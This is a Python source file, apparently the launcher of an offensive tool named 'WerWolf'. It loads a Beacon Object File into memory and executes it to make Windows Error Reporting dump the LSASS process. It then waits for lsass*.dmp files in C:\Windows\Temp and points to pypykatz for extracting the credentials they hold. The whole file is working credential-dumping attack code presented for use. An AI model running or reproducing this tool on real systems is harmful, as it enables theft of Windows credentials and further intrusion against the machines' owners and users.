import sys
import os
import time
import glob
import logging
import platform


BANNER = r"""
                          ..
                         / _}
                  _     /  /
                / `\  /  /
                \   \/  /     WerWolf
                 \     /      --------
             ,    )   (       LSASS Credential Dumper
            / \_ / \   \      via RtlReportSilentProcessExit
           /       /    \
          /   __  /   _  \    Abusing Windows Error Reporting
         /   /  \/   / \  |   In-Memory COFF/BOF Loader
        |   /   /   /   | |
         \_/   /   /  _/ /
               \__/\_/ \_/
"""

BOF_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bofs", "wer_execute.o")


def main():
    verbose = "-v" in sys.argv or "--verbose" in sys.argv

    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format="[%(levelname)s] %(message)s")

    print(BANNER)

    # Read BOF
    if not os.path.isfile(BOF_PATH):
        print(f"[!] BOF not found: {BOF_PATH}")
        sys.exit(1)

    with open(BOF_PATH, "rb") as f:
        coff_data = f.read()

    print(f"[*] BOF file   : {BOF_PATH}")
    print(f"[*] File size  : {len(coff_data):,} bytes")
    print(f"[*] Entry point: go")

    # Execution requires Windows
    if platform.system() != "Windows":
        print("\n[!] Execution requires Windows (VirtualAlloc, LoadLibrary, etc.)")
        sys.exit(1)

    # Load and execute
    from loader.loader import CoffLoader

    print(f"[*] Platform   : {platform.system()} {platform.machine()}")
    print()

    loader = CoffLoader()
    loader.load_and_execute(coff_data, entry_name="go")

    # WerFault.exe dumps LSASS asynchronously, wait for it
    dump_dir = r"C:\Windows\Temp"
    print()
    print("[*] Waiting for WerFault to write the dump...")

    for i in range(30):
        matches = glob.glob(os.path.join(dump_dir, "lsass*.dmp"))
        if matches:
            for m in matches:
                size_mb = os.path.getsize(m) / (1024 * 1024)
                print(f"[+] Dump found: {m} ({size_mb:.1f} MB)")
            print(f"[*] Parse with: pypykatz lsa minidump {matches[0]}")
            break
        time.sleep(2)
    else:
        print("[!] No dump found after 60 seconds.")
        print(f"[*] Check {dump_dir} manually, WerFault may still be writing.")

    print()
    print("=" * 60)
    print("  Execution complete.")
    print("=" * 60)


if __name__ == "__main__":
    main()
